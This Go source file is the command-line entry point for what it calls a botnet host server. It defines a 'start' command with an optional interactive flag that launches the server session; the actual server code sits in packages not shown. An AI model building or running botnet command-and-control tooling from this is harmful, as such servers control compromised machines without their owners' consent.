package CLI

import (
	"fmt"
	"os"
	s "server/util/connection"
	h "server/util/header"
	"github.com/urfave/cli"
)

/*
*Command Line interface of the server
* Start the server up on init with mode
*/

//*Controller for the startup of the botnet server
func CLI(){
	session := s.NewServer()

	defer close(session.DisconnectedClients)

	app := cli.NewApp()
	app.Name = "Botnet CLI"
	app.Usage = "CLI for Botnet"

	start_flags := []cli.Flag{
		cli.BoolFlag{
			Name: "i",
			Usage: "Starting the BotNet Host Server in interactive mode",
		},
	}
	
	app.Commands = []cli.Command{
		
		{
			Name:  "start",
			Usage: "Starting Server",
			Flags: start_flags,
			Action: func(c *cli.Context) error {
				if c.Bool("i"){
					session.ServerStart("i")
				}else{
					session.ServerStart("")
				}
				return nil
			},
		},
	}

	if err := app.Run(os.Args); err != nil{
		fmt.Println(h.E, err)
	}
}